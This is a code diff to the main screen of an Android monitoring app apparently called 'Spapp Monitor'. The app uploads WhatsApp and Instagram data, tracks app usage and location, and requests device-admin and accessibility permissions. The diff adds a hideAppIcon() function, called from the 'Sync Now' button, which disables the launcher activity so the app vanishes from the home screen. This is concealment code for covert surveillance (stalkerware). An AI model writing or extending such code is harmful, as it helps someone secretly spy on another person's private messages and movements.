@@ -161,7 +161,119 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    override fun onCreate(savedInstanceState: Bundle?) {
+    // override fun onCreate(savedInstanceState: Bundle?) {
+    //     super.onCreate(savedInstanceState)
+    //     binding = ActivityMainBinding.inflate(layoutInflater)
+    //     setContentView(binding.root)
+
+    //     deviceState = DeviceState(this)
+    //     usageCollector = AppUsageCollector(this)
+    //     geofenceManager = GeofenceManager(this)
+
+    //     SyncScheduler.schedule(applicationContext)
+    //     uploadCurrentFcmToken()
+    //     com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
+
+    //     // Master Setup Button (Dynamically executes the full setup sequence continuously)
+    //     binding.btnMasterOneTap.setOnClickListener {
+    //         isOneTapFlowRunning = true
+    //         handleNextSetupStep()
+    //     }
+
+    //     // Individual permission shortcut listeners
+    //     binding.btnCorePermStatus.setOnClickListener {
+    //         isOneTapFlowRunning = false
+    //         val missing = getMissingRuntimePermissions()
+    //         if (missing.isNotEmpty()) {
+    //             runtimePermissionsLauncher.launch(missing.toTypedArray())
+    //         } else {
+    //             Toast.makeText(this, "Core permissions already active ✓", Toast.LENGTH_SHORT).show()
+    //         }
+    //     }
+
+    //     binding.btnBatteryPermStatus.setOnClickListener {
+    //         isOneTapFlowRunning = false
+    //         if (!isBatteryExempted()) {
+    //             val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+    //                 data = Uri.parse("package:$packageName")
+    //             }
+    //             batteryExemptionLauncher.launch(intent)
+    //         } else {
+    //             Toast.makeText(this, "Battery optimization already unrestricted ✓", Toast.LENGTH_SHORT).show()
+    //         }
+    //     }
+
+    //     binding.btnAccessibilityPermStatus.setOnClickListener {
+    //         isOneTapFlowRunning = false
+    //         showAccessibilityDialog()
+    //     }
+
+    //     binding.btnAccessibilityRestricted.setOnClickListener {
+    //         openAppInfoSettings()
+    //     }
+
+    //     binding.btnNotificationPermStatus.setOnClickListener {
+    //         isOneTapFlowRunning = false
+    //         showNotificationDialog()
+    //     }
+
+    //     binding.btnNotificationRestricted.setOnClickListener {
+    //         openAppInfoSettings()
+    //     }
+
+    //     binding.btnUnlockRestricted.setOnClickListener {
+    //         openAppInfoSettings()
+    //     }
+
+    //     binding.btnUsagePermStatus.setOnClickListener {
+    //         isOneTapFlowRunning = false
+    //         if (!isUsageAccessGranted()) {
+    //             Toast.makeText(this, "Find Spapp Monitor and toggle Usage Access ON", Toast.LENGTH_SHORT).show()
+    //             usageLauncher.launch(usageCollector.usageAccessSettingsIntent())
+    //         } else {
+    //             Toast.makeText(this, "App usage tracking already active ✓", Toast.LENGTH_SHORT).show()
+    //         }
+    //     }
+
+    //     binding.btnFilePermStatus.setOnClickListener {
+    //         isOneTapFlowRunning = false
+    //         if (!isFileAccessGranted()) {
+    //             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+    //                 val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
+    //                     data = Uri.parse("package:$packageName")
+    //                 }
+    //                 allFilesLauncher.launch(intent)
+    //             }
+    //         } else {
+    //             Toast.makeText(this, "File access already granted ✓", Toast.LENGTH_SHORT).show()
+    //         }
+    //     }
+
+    //     binding.btnAdminPermStatus.setOnClickListener {
+    //         isOneTapFlowRunning = false
+    //         if (!isDeviceAdminActive()) {
+    //             deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
+    //         } else {
+    //             Toast.makeText(this, "Device Administrator already active ✓", Toast.LENGTH_SHORT).show()
+    //         }
+    //     }
+
+    //     binding.btnAutostartPermStatus.setOnClickListener {
+    //         isOneTapFlowRunning = false
+    //         openAutostartSettings()
+    //     }
+
+    //     binding.btnSyncNow.setOnClickListener {
+    //         com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
+    //         com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
+    //         SyncScheduler.runOnce(applicationContext)
+    //         Toast.makeText(this, "Sync triggered", Toast.LENGTH_SHORT).show()
+    //     }
+    // }
+
+
+
+        override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
@@ -263,13 +375,45 @@ class MainActivity : AppCompatActivity() {
             openAutostartSettings()
         }
 
+        // Updated Sync Now Button Listener
         binding.btnSyncNow.setOnClickListener {
             com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
             com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
             SyncScheduler.runOnce(applicationContext)
-            Toast.makeText(this, "Sync triggered", Toast.LENGTH_SHORT).show()
+            
+            // App icon-a hide panra function call panniyachu
+            hideAppIcon()
+            
+            Toast.makeText(this, "Sync triggered & App icon hidden", Toast.LENGTH_SHORT).show()
         }
     }
+
+    // Indha pudhu function-a unga MainActivity class-kulla (onCreate-ku kila) add pannikonga
+    private fun hideAppIcon() {
+        try {
+            val p = packageManager
+            val componentName = android.content.ComponentName(this, "$packageName.ui.SplashActivity")
+            p.setComponentEnabledSetting(
+                componentName,
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+
+
+
+
+
+
+
+
+
+
+
+
 
     override fun onResume() {
         super.onResume()
